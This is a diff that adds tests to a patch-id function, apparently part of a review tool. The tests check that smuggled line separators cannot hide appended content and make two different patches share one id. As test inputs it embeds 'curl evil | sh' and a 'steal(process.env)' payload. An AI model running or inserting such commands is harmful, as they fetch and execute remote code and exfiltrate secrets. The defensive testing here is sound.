@@ -33,4 +33,20 @@ describe('a patch id', () => {
   it('is no id for no files', () => {
     expect(patchId([])).toBeNull()
   })
+
+  // Security review of #3218 (Warden2), Critical 1: a lone CR, U+2028 or U+2029 inside a line began a "line" that read as a
+  // hunk header, and the rest of the real line was dropped, so two different patches had one id.
+  it('reads lines split at a line feed only, and only a real hunk header loses its positions', () => {
+    for (const mark of ['\u2028', '\u2029', '\r']) {
+      const line = `+s = "${mark}@@ a @@ "`
+      expect(patchId([file('a.py', `@@ -1 +1 @@\n${line}`)])).not.toBe(patchId([file('a.py', `@@ -1 +1 @@\n${line}; os.system("curl evil | sh")`)]))
+    }
+    expect(patchId([file('a.ts', '@@ -1 +1 @@\n+x = `\r@@ b @@ `')])).not.toBe(patchId([file('a.ts', '@@ -1 +1 @@\n+x = `\r@@ b @@ ${steal(process.env)}`')]))
+    // A line of the file that merely starts with "@@" is content, kept whole.
+    expect(patchId([file('a.md', '@@ -1 +1 @@\n+@@ -1 +1 @@ one')])).not.toBe(patchId([file('a.md', '@@ -1 +1 @@\n+@@ -1 +1 @@ two')]))
+  })
+
+  it('keeps the function a hunk header names', () => {
+    expect(patchId([file('a.ts', parser)])).not.toBe(patchId([file('a.ts', parser.replace('export function parse()', 'export function other()'))]))
+  })
 })
